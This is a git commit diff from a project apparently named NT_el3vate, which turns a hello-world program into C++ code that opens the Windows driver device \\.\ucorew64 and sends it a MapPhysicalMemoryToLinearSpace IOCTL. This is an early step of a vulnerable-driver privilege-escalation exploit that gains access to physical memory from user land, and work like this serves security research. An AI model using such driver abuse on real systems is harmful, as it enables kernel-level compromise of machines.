84070510af261435608912ea72cf19668ebc1c46
vnescape <vnescape@protonmail.com>
2022-11-01 11:26:04 +0100

    Obtain Handle to \Device\PhysicalMemory

--- NT_el3vate/main.cpp
+++ NT_el3vate/main.cpp
@@ -1,7 +1,30 @@
-#include <cstdlib>
-#include <stdio.h>
+#include <iostream>
+#include <Windows.h>
 
-int main(void) {
-	printf("%s", "Hello NT :)");
-	return EXIT_SUCCESS;
+#define MapPhysicalMemoryToLinearSpace 0xFA002EE8
+
+int main(char argc, char** argv)
+{
+    HANDLE device = INVALID_HANDLE_VALUE;
+    BOOL status = FALSE;
+    DWORD bytesReturned = 0;
+    CHAR inBuffer[64] = { 0 };
+    CHAR outBuffer[64] = { 0 };
+
+    device = CreateFileW(L"\\\\.\\ucorew64", GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
+
+    if (device == INVALID_HANDLE_VALUE)
+    {
+        printf("> Could not open device: 0x%X\n", GetLastError());
+        return FALSE;
+    }
+
+    printf("[ ] Calling MapPhysicalMemoryToLinearSpace 0x%X\n", MapPhysicalMemoryToLinearSpace);
+    status = DeviceIoControl(device, MapPhysicalMemoryToLinearSpace, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
+    printf("[*] MapPhysicalMemoryToLinearSpace 0x%X called\n", MapPhysicalMemoryToLinearSpace);
+    printf("[*] Buffer from the kernel land: %02X. Received buffer size: %d\n", outBuffer[0], bytesReturned);
+
+    system("pause");
+    CloseHandle(device);
+    return EXIT_SUCCESS;
 }
